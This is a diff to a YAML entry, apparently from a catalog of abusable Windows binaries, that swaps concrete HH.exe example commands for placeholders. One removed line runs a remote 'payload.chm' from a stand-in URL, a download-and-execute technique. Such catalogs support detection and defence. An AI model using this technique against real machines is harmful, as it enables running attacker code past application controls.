@@ -14,8 +14,8 @@ Commands:
     Tags:
       - Execute: EXE
       - Application: GUI
-  - Command: HH.exe c:\windows\system32\calc.exe
-    Description: Executes calc.exe with HTML Help.
+  - Command: HH.exe {PATH_ABSOLUTE:.exe}
+    Description: Executes specified executable with HTML Help.
     Usecase: Execute process with HH.exe
     Category: Execute
     Privileges: User
@@ -24,8 +24,8 @@ Commands:
     Tags:
       - Execute: EXE
       - Application: GUI
-  - Command: HH.exe http://some.url/payload.chm
-    Description: Executes a remote payload.chm file which can contain commands.
+  - Command: HH.exe {REMOTEURL:.chm}
+    Description: Executes a remote .chm file which can contain commands.
     Usecase: Execute commands with HH.exe
     Category: Execute
     Privileges: User
